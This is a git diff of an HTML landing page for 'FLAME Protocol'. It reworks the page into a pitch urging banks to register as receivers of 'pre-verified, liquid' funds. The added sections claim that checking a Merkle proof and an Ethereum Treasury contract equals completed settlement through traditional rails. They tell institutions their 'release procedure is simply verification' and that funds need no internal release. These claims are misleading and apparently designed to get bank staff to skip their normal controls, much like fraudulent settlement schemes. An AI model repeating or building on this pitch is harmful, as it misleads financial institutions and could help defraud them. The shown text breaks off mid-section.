@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FLAME Protocol | Institutional Settlement Infrastructure</title>
-    <meta name="description" content="Deterministic settlement verification for financial institutions. Validate chain of title, clean funds, asset backing, and liquidity through cryptographic proof.">
+    <meta name="description" content="Receive verified, liquid funds through FLAME Protocol. No release procedures - funds arrive settled, like cryptocurrency but through traditional rails.">
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -27,6 +27,7 @@
     --slate-600: #475569;
     --white: #ffffff;
     --success: #10b981;
+    --warning: #f59e0b;
     --danger: #ef4444;
     --font-display: 'Cormorant Garamond', Georgia, serif;
     --font-body: 'DM Sans', -apple-system, sans-serif;
@@ -44,11 +45,12 @@ a { transition: all 0.2s ease; }
 
 .section-label { font-family: var(--font-body); font-size: 0.75rem; font-weight: 600; letter-spacing: 0.15em; text-transform: uppercase; color: var(--gold-500); margin-bottom: 16px; }
 .section-title { font-size: clamp(2rem, 4vw, 3rem); margin-bottom: 16px; }
-.section-subtitle { font-size: 1.125rem; color: var(--slate-500); max-width: 600px; }
+.section-subtitle { font-size: 1.125rem; color: var(--slate-500); max-width: 700px; line-height: 1.7; }
 .section-header { text-align: center; margin-bottom: 64px; }
 .section-header .section-subtitle { margin: 0 auto; }
 .text-muted { color: var(--slate-400); }
 .text-gold { color: var(--gold-500); }
+.text-success { color: var(--success); }
 
 /* Navigation */
 .nav { position: fixed; top: 0; left: 0; right: 0; z-index: 1000; background: rgba(10, 22, 40, 0.95); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
@@ -70,16 +72,16 @@ a { transition: all 0.2s ease; }
 .hero-bg { position: absolute; inset: 0; background: linear-gradient(135deg, var(--navy-900) 0%, var(--navy-700) 100%); }
 .hero-gradient { position: absolute; inset: 0; background: radial-gradient(ellipse at 30% 20%, rgba(201, 162, 39, 0.15) 0%, transparent 50%), radial-gradient(ellipse at 70% 80%, rgba(30, 58, 95, 0.5) 0%, transparent 50%); }
 .hero-grid { position: absolute; inset: 0; background-image: linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px); background-size: 60px 60px; mask-image: radial-gradient(ellipse at center, black 30%, transparent 70%); }
-.hero-content { position: relative; max-width: 600px; padding: 0 24px; margin-left: calc((100vw - var(--container-max)) / 2 + 24px); }
+.hero-content { position: relative; max-width: 650px; padding: 0 24px; margin-left: calc((100vw - var(--container-max)) / 2 + 24px); }
 @media (max-width: 1248px) { .hero-content { margin-left: 24px; } }
 
-.hero-badge { display: inline-flex; align-items: center; gap: 8px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); padding: 8px 16px; border-radius: 100px; font-size: 0.75rem; font-weight: 500; letter-spacing: 0.05em; text-transform: uppercase; color: var(--slate-300); margin-bottom: 32px; }
+.hero-badge { display: inline-flex; align-items: center; gap: 8px; background: rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); padding: 8px 16px; border-radius: 100px; font-size: 0.75rem; font-weight: 600; letter-spacing: 0.05em; text-transform: uppercase; color: var(--success); margin-bottom: 32px; }
 .badge-dot { width: 8px; height: 8px; background: var(--success); border-radius: 50%; animation: pulse 2s ease-in-out infinite; }
 @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(1.2); } }
 
-.hero-title { font-size: clamp(2.5rem, 5vw, 4rem); color: var(--white); margin-bottom: 24px; line-height: 1.1; }
+.hero-title { font-size: clamp(2.5rem, 5vw, 3.75rem); color: var(--white); margin-bottom: 24px; line-height: 1.1; }
 .title-accent { color: var(--gold-400); font-style: italic; }
-.hero-subtitle { font-size: 1.125rem; color: var(--slate-300); margin-bottom: 40px; line-height: 1.7; }
+.hero-subtitle { font-size: 1.25rem; color: var(--slate-300); margin-bottom: 40px; line-height: 1.7; }
 .hero-actions { display: flex; gap: 16px; margin-bottom: 64px; flex-wrap: wrap; }
 
 /* Buttons */
@@ -88,10 +90,11 @@ a { transition: all 0.2s ease; }
 .btn-primary:hover { background: var(--gold-400); transform: translateY(-2px); box-shadow: 0 8px 24px rgba(201, 162, 39, 0.3); }
 .btn-secondary { background: rgba(255, 255, 255, 0.1); color: var(--white); border: 1px solid rgba(255, 255, 255, 0.2); }
 .btn-secondary:hover { background: rgba(255, 255, 255, 0.15); border-color: rgba(255, 255, 255, 0.3); }
+.btn-success { background: var(--success); color: var(--white); }
+.btn-success:hover { background: #0ea472; transform: translateY(-2px); }
 .btn-outline { background: transparent; border: 2px solid var(--gold-500); color: var(--gold-500); }
 .btn-outline:hover { background: var(--gold-500); color: var(--navy-900); }
 .btn-full { width: 100%; justify-content: center; }
-.btn-sm { padding: 10px 20px; font-size: 0.875rem; }
 
 /* Stats */
 .hero-stats { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; }
@@ -101,7 +104,7 @@ a { transition: all 0.2s ease; }
 .stat-divider { width: 1px; height: 48px; background: rgba(255, 255, 255, 0.1); }
 
 /* Visual */
-.hero-visual { position: absolute; right: calc((100vw - var(--container-max)) / 2 + 24px); top: 50%; transform: translateY(-50%); width: 480px; }
+.hero-visual { position: absolute; right: calc((100vw - var(--container-max)) / 2 + 24px); top: 50%; transform: translateY(-50%); width: 440px; }
 @media (max-width: 1248px) { .hero-visual { right: 24px; } }
 @media (max-width: 1024px) { .hero-visual { display: none; } }
 .visual-card { background: rgba(15, 33, 64, 0.8); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; overflow: hidden; box-shadow: 0 24px 48px rgba(0, 0, 0, 0.3); }
@@ -110,10 +113,63 @@ a { transition: all 0.2s ease; }
 .visual-dot.green { background: #10b981; }
 .visual-dot.yellow { background: #f59e0b; }
 .visual-dot.red { background: #ef4444; }
-.visual-code { padding: 24px; margin: 0; font-family: var(--font-mono); font-size: 0.875rem; line-height: 1.8; color: var(--slate-300); overflow-x: auto; }
+.visual-code { padding: 24px; margin: 0; font-family: var(--font-mono); font-size: 0.8125rem; line-height: 1.8; color: var(--slate-300); overflow-x: auto; }
 .code-key { color: #7dd3fc; }
 .code-value { color: #4ade80; }
 .code-string { color: #fbbf24; }
+
+/* AHA MOMENT SECTION - THE KEY */
+.aha-moment { padding: var(--section-padding) 0; background: linear-gradient(180deg, #065f46 0%, #064e3b 100%); position: relative; overflow: hidden; }
+.aha-moment::before { content: ''; position: absolute; inset: 0; background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E"); }
+.aha-content { position: relative; max-width: 900px; margin: 0 auto; text-align: center; }
+.aha-label { display: inline-flex; align-items: center; gap: 8px; background: rgba(255, 255, 255, 0.1); padding: 10px 20px; border-radius: 100px; font-size: 0.875rem; font-weight: 600; color: var(--gold-300); margin-bottom: 32px; }
+.aha-title { font-size: clamp(2rem, 4vw, 3rem); color: var(--white); margin-bottom: 32px; line-height: 1.2; }
+.aha-title .highlight { color: var(--gold-300); display: block; font-size: 1.1em; }
+
+.aha-comparison { display: grid; grid-template-columns: 1fr auto 1fr; gap: 32px; margin: 48px 0; align-items: center; }
+@media (max-width: 768px) { .aha-comparison { grid-template-columns: 1fr; } }
+
+.compare-box { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 16px; padding: 32px; text-align: left; }
+.compare-box.highlight-box { background: rgba(201, 162, 39, 0.15); border-color: var(--gold-500); }
+.compare-icon { font-size: 2.5rem; margin-bottom: 16px; }
+.compare-title { color: var(--white); font-size: 1.25rem; margin-bottom: 12px; }
+.compare-desc { color: var(--slate-300); font-size: 0.9375rem; line-height: 1.6; margin-bottom: 20px; }
+.compare-steps { list-style: none; }
+.compare-steps li { color: var(--slate-300); font-size: 0.875rem; padding: 8px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05); display: flex; align-items: center; gap: 10px; }
+.compare-steps li:last-child { border: none; }
+.step-num { width: 24px; height: 24px; background: rgba(255, 255, 255, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 700; color: var(--gold-400); flex-shrink: 0; }
+.compare-box.highlight-box .step-num { background: var(--gold-500); color: var(--navy-900); }
+
+.compare-equals { font-size: 3rem; color: var(--gold-400); font-weight: 700; }
+@media (max-width: 768px) { .compare-equals { transform: rotate(90deg); margin: 0 auto; } }
+
+.aha-quote { background: rgba(0, 0, 0, 0.2); border-radius: 12px; padding: 32px; margin-top: 48px; }
+.aha-quote blockquote { font-family: var(--font-display); font-size: 1.5rem; font-style: italic; color: var(--white); margin-bottom: 16px; line-height: 1.5; }
+.aha-quote cite { color: var(--gold-300); font-size: 0.875rem; font-style: normal; }
+
+.aha-bottom { margin-top: 48px; }
+.aha-bottom p { color: var(--slate-300); font-size: 1.125rem; margin-bottom: 24px; }
+
+/* Key Point Boxes */
+.key-points { padding: var(--section-padding) 0; background: var(--slate-100); }
+.key-points-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 32px; }
+@media (max-width: 900px) { .key-points-grid { grid-template-columns: 1fr; } }
+.key-point { background: var(--white); border-radius: 16px; padding: 40px; text-align: center; border: 2px solid transparent; transition: all 0.3s; }
+.key-point:hover { border-color: var(--gold-500); transform: translateY(-4px); box-shadow: 0 12px 32px rgba(0,0,0,0.1); }
+.key-point-icon { width: 72px; height: 72px; background: linear-gradient(135deg, var(--gold-400) 0%, var(--gold-500) 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 2rem; }
+.key-point h4 { font-size: 1.25rem; margin-bottom: 12px; }
+.key-point p { color: var(--slate-500); line-height: 1.7; }
+
+/* How You Validate Section */
+.validate-section { padding: var(--section-padding) 0; background: var(--white); }
+.validate-flow { display: flex; flex-direction: column; gap: 0; max-width: 800px; margin: 0 auto; }
+.validate-step { display: grid; grid-template-columns: 80px 1fr; gap: 24px; padding: 32px 0; border-bottom: 1px solid var(--slate-200); }
+.validate-step:last-child { border: none; }
+.step-marker { width: 64px; height: 64px; background: var(--navy-900); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-family: var(--font-display); font-size: 1.5rem; font-weight: 700; color: var(--gold-400); }
+.step-content h4 { font-size: 1.25rem; margin-bottom: 8px; color: var(--navy-900); }
+.step-content p { color: var(--slate-500); margin-bottom: 16px; line-height: 1.7; }
+.step-code { background: var(--navy-900); border-radius: 8px; padding: 16px 20px; font-family: var(--font-mono); font-size: 0.8125rem; color: var(--slate-300); overflow-x: auto; }
+.step-result { display: inline-flex; align-items: center; gap: 8px; background: rgba(16, 185, 129, 0.1); color: var(--success); padding: 8px 16px; border-radius: 6px; font-size: 0.875rem; font-weight: 600; margin-top: 12px; }
 
 /* Contracts Section */
 .contracts { padding: var(--section-padding) 0; background: var(--navy-900); }
@@ -132,94 +188,37 @@ a { transition: all 0.2s ease; }
 .contract-link:hover { background: var(--gold-500); color: var(--navy-900); border-color: var(--gold-500); }
 .contract-link svg { width: 14px; height: 14px; }
 
-/* Problem */
-.problem { padding: var(--section-padding) 0; background: var(--slate-100); }
-.problem-content { max-width: 700px; margin-bottom: 64px; }
-.problem-title { font-size: clamp(1.75rem, 3vw, 2.5rem); margin-bottom: 24px; }
-.problem-text { font-size: 1.125rem; color: var(--slate-500); }
-.problem-comparison { display: grid; grid-template-columns: 1fr 1fr; gap: 32px; }
-@media (max-width: 768px) { .problem-comparison { grid-template-columns: 1fr; } }
-.comparison-card { background: var(--white); border-radius: 16px; padding: 40px; position: relative; }
-.comparison-card h4 { font-size: 1.25rem; margin-bottom: 24px; }
-.comparison-card ul { list-style: none; display: flex; flex-direction: column; gap: 16px; }
-.comparison-card li { display: flex; align-items: flex-start; gap: 12px; font-size: 0.9375rem; color: var(--slate-600); }
-.icon-x, .icon-check { width: 20px; height: 20px; flex-shrink: 0; stroke-width: 2.5; margin-top: 2px; fill: none; stroke: currentColor; }
-.icon-x { color: var(--danger); }
-.icon-check { color: var(--success); }
-.traditional { background: var(--white); border: 1px solid var(--slate-200); }
-.flame { background: var(--navy-900); color: var(--white); }
-.flame h4 { color: var(--white); }
-.flame li { color: var(--slate-300); }
-.flame-badge { position: absolute; top: -12px; left: 32px; background: var(--gold-500); color: var(--navy-900); padding: 6px 16px; border-radius: 100px; font-size: 0.75rem; font-weight: 700; letter-spacing: 0.05em; }
+/* Receiver Registration Form */
+.register { padding: var(--section-padding) 0; background: var(--white); }
+.register-card { display: grid; grid-template-columns: 1fr 480px; gap: 64px; background: var(--navy-900); border-radius: 24px; padding: 64px; }
+@media (max-width: 1024px) { .register-card { grid-template-columns: 1fr; padding: 40px; } }
+.register-content .section-label { color: var(--gold-400); }
+.register-title { font-size: clamp(1.75rem, 3vw, 2.5rem); color: var(--white); margin-bottom: 16px; }
+.register-text { color: var(--slate-300); margin-bottom: 32px; font-size: 1.0625rem; line-height: 1.7; }
 
-/* Pillars */
-.pillars { padding: var(--section-padding) 0; background: var(--white); }
-.pillars-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 32px; }
-@media (max-width: 900px) { .pillars-grid { grid-template-columns: 1fr; } }
-.pillar-card { background: var(--slate-100); border-radius: 16px; padding: 40px; position: relative; transition: all 0.3s; }
-.pillar-card:hover { background: var(--navy-900); transform: translateY(-4px); box-shadow: 0 24px 48px rgba(10, 22, 40, 0.15); }
-.pillar-card:hover * { color: var(--white); }
-.pillar-card:hover .pillar-description, .pillar-card:hover .pillar-details li { color: var(--slate-300); }
-.pillar-card:hover .pillar-proof { background: rgba(255, 255, 255, 0.1); border-color: rgba(255, 255, 255, 0.2); }
-.pillar-number { position: absolute; top: 32px; right: 32px; font-family: var(--font-display); font-size: 3rem; font-weight: 600; color: var(--slate-200); line-height: 1; transition: color 0.3s; }
-.pillar-card:hover .pillar-number { color: rgba(255, 255, 255, 0.1); }
-.pillar-icon { width: 56px; height: 56px; color: var(--gold-500); margin-bottom: 24px; }
-.pillar-icon svg { width: 100%; height: 100%; }
-.pillar-title { font-size: 1.375rem; margin-bottom: 12px; }
-.pillar-description { color: var(--slate-500); margin-bottom: 24px; line-height: 1.7; }
-.pillar-details { margin-bottom: 24px; }
-.pillar-details h5 { font-family: var(--font-body); font-size: 0.75rem; font-weight: 600; letter-spacing: 0.1em; text-transform: uppercase; color: var(--gold-500); margin-bottom: 12px; }
-.pillar-details ul { list-style: none; display: flex; flex-direction: column; gap: 8px; }
-.pillar-details li { font-size: 0.875rem; color: var(--slate-600); padding-left: 16px; position: relative; }
-.pillar-details li::before { content: "→"; position: absolute; left: 0; color: var(--gold-500); }
-.pillar-proof { display: inline-flex; align-items: center; gap: 8px; background: var(--white); border: 1px solid var(--slate-200); padding: 8px 16px; border-radius: 6px; transition: all 0.3s; }
-.proof-label { font-size: 0.75rem; color: var(--slate-500); }
-.pillar-proof code { font-family: var(--font-mono); font-size: 0.8125rem; color: var(--navy-700); }
-.pillar-card:hover .pillar-proof code { color: var(--gold-400); }
+.what-we-need { margin-top: 32px; }
+.what-we-need h4 { color: var(--white); font-size: 1.125rem; margin-bottom: 20px; }
+.need-item { display: flex; gap: 16px; margin-bottom: 20px; }
+.need-icon { width: 48px; height: 48px; background: rgba(255, 255, 255, 0.05); border-radius: 10px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+.need-icon svg { width: 24px; height: 24px; color: var(--gold-400); }
+.need-text h5 { color: var(--white); font-size: 1rem; margin-bottom: 4px; font-family: var(--font-body); font-weight: 600; }
+.need-text p { color: var(--slate-400); font-size: 0.875rem; line-height: 1.5; }
 
-/* Determinism */
-.determinism { padding: var(--section-padding) 0; background: linear-gradient(180deg, var(--navy-800) 0%, var(--navy-900) 100%); }
-.determinism-content { max-width: 800px; margin: 0 auto; text-align: center; }
-.determinism-title { font-size: clamp(2rem, 4vw, 3rem); color: var(--white); margin-bottom: 24px; }
-.determinism-text { font-size: 1.125rem; color: var(--slate-300); margin-bottom: 64px; line-height: 1.8; }
-.determinism-text em { color: var(--gold-400); font-style: normal; font-weight: 600; }
-.determinism-diagram { display: flex; align-items: center; justify-content: center; gap: 24px; margin-bottom: 64px; flex-wrap: wrap; }
-.diagram-label { display: block; font-size: 0.75rem; font-weight: 600; letter-spacing: 0.1em; text-transform: uppercase; color: var(--slate-400); margin-bottom: 12px; }
-.diagram-box { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; padding: 20px 32px; display: flex; flex-direction: column; gap: 8px; }
-.diagram-box code { font-family: var(--font-mono); font-size: 0.875rem; color: var(--slate-300); }
-.diagram-box.gold { border-color: var(--gold-500); background: rgba(201, 162, 39, 0.1); }
-.diagram-box.gold code { color: var(--gold-400); font-size: 1rem; }
-.diagram-arrow { display: flex; flex-direction: column; align-items: center; gap: 8px; color: var(--slate-500); }
-.diagram-arrow svg { width: 100px; }
-.diagram-arrow span { font-family: var(--font-mono); font-size: 0.75rem; color: var(--slate-400); }
-.determinism-benefits { display: grid; grid-template-columns: repeat(3, 1fr); gap: 32px; }
-@media (max-width: 768px) { .determinism-benefits { grid-template-columns: 1fr; } }
-.benefit { text-align: center; }
-.benefit h5 { color: var(--gold-400); font-size: 1rem; margin-bottom: 8px; }
-.benefit p { color: var(--slate-400); font-size: 0.9375rem; }
-
-/* Download Section */
-.download { padding: var(--section-padding) 0; background: var(--white); }
-.download-card { display: grid; grid-template-columns: 1fr 420px; gap: 64px; background: var(--navy-900); border-radius: 24px; padding: 64px; }
-@media (max-width: 1024px) { .download-card { grid-template-columns: 1fr; padding: 40px; } }
-.download-content .section-label { color: var(--gold-400); }
-.download-title { font-size: clamp(1.75rem, 3vw, 2.5rem); color: var(--white); margin-bottom: 16px; }
-.download-text { color: var(--slate-300); margin-bottom: 32px; font-size: 1.0625rem; line-height: 1.7; }
-.package-contents h4 { color: var(--white); font-size: 1rem; margin-bottom: 20px; }
-.contents-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 16px; }
-@media (max-width: 600px) { .contents-grid { grid-template-columns: 1fr; } }
-.content-item { display: flex; align-items: center; gap: 12px; color: var(--slate-300); font-size: 0.875rem; }
-.content-item svg { width: 20px; height: 20px; color: var(--gold-500); flex-shrink: 0; }
-
-/* Form */
-.download-form { background: var(--white); border-radius: 16px; padding: 40px; }
+/* Form Styles */
+.register-form { background: var(--white); border-radius: 16px; padding: 40px; }
+.form-section-title { font-size: 1rem; font-weight: 600; color: var(--navy-900); margin-bottom: 20px; padding-bottom: 12px; border-bottom: 2px solid var(--slate-200); display: flex; align-items: center; gap: 8px; }
+.form-section-title svg { width: 20px; height: 20px; color: var(--gold-500); }
 .form-group { margin-bottom: 20px; }
+.form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+@media (max-width: 600px) { .form-row { grid-template-columns: 1fr; } }
 .form-group label { display: block; font-size: 0.875rem; font-weight: 500; color: var(--navy-900); margin-bottom: 8px; }
+.form-group label .required { color: var(--danger); }
 .form-group input, .form-group select, .form-group textarea { width: 100%; padding: 14px 16px; border: 1px solid var(--slate-200); border-radius: 8px; font-size: 1rem; font-family: var(--font-body); color: var(--navy-900); background: var(--white); transition: border-color 0.2s; }
 .form-group input::placeholder, .form-group textarea::placeholder { color: var(--slate-400); }
 .form-group input:focus, .form-group select:focus, .form-group textarea:focus { outline: none; border-color: var(--gold-500); box-shadow: 0 0 0 3px rgba(201, 162, 39, 0.1); }
-.form-group textarea { min-height: 100px; resize: vertical; }
-.form-note { text-align: center; font-size: 0.8125rem; color: var(--slate-500); margin-top: 16px; }
+.form-group textarea { min-height: 80px; resize: vertical; }
+.form-group .form-hint { font-size: 0.75rem; color: var(--slate-500); margin-top: 6px; }
+.form-note { text-align: center; font-size: 0.8125rem; color: var(--slate-500); margin-top: 20px; }
 .form-note a { color: var(--gold-500); }
 
 /* Trust */
@@ -259,10 +258,6 @@ a { transition: all 0.2s ease; }
 .hero-subtitle { animation-delay: 0.3s; }
 .hero-actions { animation-delay: 0.4s; }
 .hero-stats { animation-delay: 0.5s; }
-
-/* Utility */
-.mb-4 { margin-bottom: 32px; }
-.mt-4 { margin-top: 32px; }
     </style>
 </head>
 <body>
@@ -274,10 +269,10 @@ a { transition: all 0.2s ease; }
                 <span class="logo-text">FLAME<span class="logo-suffix">PROTOCOL</span></span>
             </a>
             <div class="nav-links" id="nav-links">
+                <a href="#aha">How It Works</a>
+                <a href="#validate">Validation Process</a>
                 <a href="#contracts">Verify on Mainnet</a>
-                <a href="#verification">Four Pillars</a>
-                <a href="#determinism">Determinism</a>
-                <a href="#download" class="nav-cta">Request Access</a>
+                <a href="#register" class="nav-cta">Register as Receiver</a>
             </div>
             <button class="nav-mobile-toggle" id="nav-toggle" aria-label="Menu">
                 <span></span>
@@ -296,45 +291,45 @@ a { transition: all 0.2s ease; }
         <div class="hero-content">
             <div class="hero-badge">
                 <span class="badge-dot"></span>
-                Live on Ethereum Mainnet
+                Funds Are Already Liquid
             </div>
             <h1 class="hero-title">
-                Verify Funds at the<br>
-                <span class="title-accent">Substrate Level</span>
+                Receive Settled Funds.<br>
+                <span class="title-accent">No Release Required.</span>
             </h1>
             <p class="hero-subtitle">
-                FLAME Protocol provides deterministic verification of chain of title, 
-                clean funds certification, asset backing, and liquidity—all cryptographically 
-                provable and verifiable directly on Ethereum mainnet.
+                FLAME Protocol delivers pre-verified, liquid funds to your institution. 
+                Like receiving Bitcoin or USDT—you validate the proof, not release the funds. 
+                They arrive <strong>already settled</strong>.
             </p>
             <div class="hero-actions">
-                <a href="#download" class="btn btn-primary">
-                    <span>Request API Access</span>
+                <a href="#register" class="btn btn-primary">
+                    <span>Register Your Node</span>
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <path d="M5 12h14M12 5l7 7-7 7"/>
                     </svg>
                 </a>
-                <a href="#contracts" class="btn btn-secondary">
-                    <span>Verify on Etherscan</span>
+                <a href="#aha" class="btn btn-secondary">
+                    <span>Understand the Difference</span>
                     <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-                        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6M15 3h6v6M10 14L21 3"/>
+                        <circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3M12 17h.01"/>
                     </svg>
                 </a>
             </div>
             <div class="hero-stats">
                 <div class="stat">
-                    <span class="stat-value">$18.2B</span>
-                    <span class="stat-label">Asset Backing</span>
+                    <span class="stat-value">Atomic</span>
+                    <span class="stat-label">Settlement</span>
                 </div>
                 <div class="stat-divider"></div>
                 <div class="stat">
-                    <span class="stat-value">100%</span>
-                    <span class="stat-label">Deterministic</span>
+                    <span class="stat-value">Pre-Verified</span>
+                    <span class="stat-label">Liquidity</span>
                 </div>
                 <div class="stat-divider"></div>
                 <div class="stat">
-                    <span class="stat-value">4</span>
-                    <span class="stat-label">Mainnet Contracts</span>
+                    <span class="stat-value">Zero</span>
+                    <span class="stat-label">Release Steps</span>
                 </div>
             </div>
         </div>
@@ -345,36 +340,240 @@ a { transition: all 0.2s ease; }
                     <span class="visual-dot yellow"></span>
                     <span class="visual-dot red"></span>
                 </div>
-                <pre class="visual-code"><code>{
-  <span class="code-key">"verification"</span>: {
-    <span class="code-key">"chain_of_title"</span>: <span class="code-value">"VALID"</span>,
-    <span class="code-key">"clean_funds"</span>: <span class="code-value">"CERTIFIED"</span>,
-    <span class="code-key">"asset_backing"</span>: <span class="code-value">"CONFIRMED"</span>,
-    <span class="code-key">"liquidity"</span>: <span class="code-value">"AVAILABLE"</span>
-  },
-  <span class="code-key">"contracts"</span>: {
-    <span class="code-key">"treasury"</span>: <span class="code-string">"0x9020...c016"</span>,
-    <span class="code-key">"verified"</span>: <span class="code-value">true</span>
-  }
+                <pre class="visual-code"><code><span class="code-key">// Incoming FLAME Settlement</span>
+
+{
+  <span class="code-key">"status"</span>: <span class="code-value">"SETTLED"</span>,
+  <span class="code-key">"liquidity"</span>: <span class="code-value">"VERIFIED"</span>,
+  <span class="code-key">"release_required"</span>: <span class="code-value">false</span>,
+  <span class="code-key">"action_needed"</span>: <span class="code-string">"NONE"</span>,
+  
+  <span class="code-key">// Just like crypto:</span>
+  <span class="code-key">"proof_valid"</span>: <span class="code-value">true</span>,
+  <span class="code-key">"funds_available"</span>: <span class="code-value">true</span>
 }</code></pre>
             </div>
         </div>
     </header>
 
-    <!-- Mainnet Contracts Section -->
+    <!-- THE AHA MOMENT SECTION -->
+    <section id="aha" class="aha-moment">
+        <div class="container">
+            <div class="aha-content">
+                <div class="aha-label">💡 The Key Insight</div>
+                <h2 class="aha-title">
+                    You Don't "Release" Bitcoin.<br>
+                    <span class="highlight">You Verify It—And It's Yours.</span>
+                </h2>
+                
+                <div class="aha-comparison">
+                    <div class="compare-box">
+                        <div class="compare-icon">₿</div>
+                        <h3 class="compare-title">Receiving Bitcoin</h3>
+                        <p class="compare-desc">When someone sends you BTC, what do you do?</p>
+                        <ol class="compare-steps">
+                            <li><span class="step-num">1</span> Check the transaction on blockchain</li>
+                            <li><span class="step-num">2</span> Verify confirmations (proof of finality)</li>
+                            <li><span class="step-num">3</span> <strong>Done.</strong> Funds are yours.</li>
+                        </ol>
+                    </div>
+                    
+                    <div class="compare-equals">=</div>
+                    
+                    <div class="compare-box highlight-box">
+                        <div class="compare-icon">◈</div>
+                        <h3 class="compare-title">Receiving FLAME Settlement</h3>
+                        <p class="compare-desc">When we send you funds, what do you do?</p>
+                        <ol class="compare-steps">
+                            <li><span class="step-num">1</span> Check the Merkle proof on Ethereum</li>
+                            <li><span class="step-num">2</span> Verify the four pillars (proof of validity)</li>
+                            <li><span class="step-num">3</span> <strong>Done.</strong> Funds are yours.</li>
+                        </ol>
+                    </div>
+                </div>
+                
+                <div class="aha-quote">
+                    <blockquote>
+                        "Do you need 'release procedures' to receive USDT? No—you verify the transaction and it's done. 
+                        FLAME works the same way, except it also settles through your traditional rails."
+                    </blockquote>
+                    <cite>— The funds are liquid BEFORE they arrive. Your job is verification, not release.</cite>
+                </div>
+                
+                <div class="aha-bottom">
+                    <p>
+                        The confusion comes from traditional wire transfers, where funds arrive "pending" 
+                        and require internal release. <strong>FLAME is different.</strong> Like cryptocurrency, 
+                        the settlement happens at the source. You receive proof of completed settlement.
+                    </p>
+                    <a href="#validate" class="btn btn-success">
+                        See the Validation Process
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M5 12h14M12 5l7 7-7 7"/>
+                        </svg>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Key Points -->
+    <section class="key-points">
+        <div class="container">
+            <div class="section-header">
+                <h2 class="section-label">Why This Matters</h2>
+                <h3 class="section-title">Three Things Banks Need to Understand</h3>
+            </div>
+            
+            <div class="key-points-grid">
+                <div class="key-point">
+                    <div class="key-point-icon">🔒</div>
+                    <h4>Funds Are Pre-Locked</h4>
+                    <p>
+                        Before any settlement instruction reaches you, the funds are already locked in our 
+                        Treasury smart contract on Ethereum mainnet. You can verify this yourself—the 
+                        blockchain doesn't lie.
+                    </p>
+                </div>
+                
+                <div class="key-point">
+                    <div class="key-point-icon">✓</div>
+                    <h4>Verification = Confirmation</h4>
+                    <p>
+                        Your "release procedure" is simply verification. Check the Merkle proof, confirm 
+                        the four pillars, validate on Etherscan. Once verified, the funds are already 
+                        yours—no additional steps needed.
+                    </p>
+                </div>
+                
+                <div class="key-point">
+                    <div class="key-point-icon">⚡</div>
+                    <h4>Atomic Settlement</h4>
+                    <p>
+                        Like a blockchain transaction, FLAME settlements are atomic. They either complete 
+                        fully or not at all. No partial states, no pending releases, no reconciliation 
+                        nightmares.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- How You Validate Section -->
+    <section id="validate" class="validate-section">
+        <div class="container">
+            <div class="section-header">
+                <h2 class="section-label">Your Process</h2>
+                <h3 class="section-title">How You Validate Incoming Funds</h3>
+                <p class="section-subtitle">
+                    This is your entire "release procedure"—verification steps that confirm 
+                    the funds are already liquid and settled.
+                </p>
+            </div>
+            
+            <div class="validate-flow">
+                <div class="validate-step">
+                    <div class="step-marker">1</div>
+                    <div class="step-content">
+                        <h4>Receive Settlement Package</h4>
+                        <p>
+                            When a FLAME settlement targets your institution, you receive a cryptographic 
+                            package containing the Merkle UID, proof data, and settlement details.
+                        </p>
+                        <div class="step-code">
+POST https://your-node.bank.example/api/settlement/receive<br>
+Content-Type: application/json<br>
+{ "merkle_uid": "0x7a5c8b3d...", "proofs": {...}, "amount_usd": 10000.00 }
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="validate-step">
+                    <div class="step-marker">2</div>
+                    <div class="step-content">
+                        <h4>Verify on Ethereum Mainnet</h4>
+                        <p>
+                            Check that the funds are locked in our Treasury contract. This is a simple 
+                            blockchain read—like checking a Bitcoin transaction.
+                        </p>
+                        <div class="step-code">
+// Etherscan verification<br>
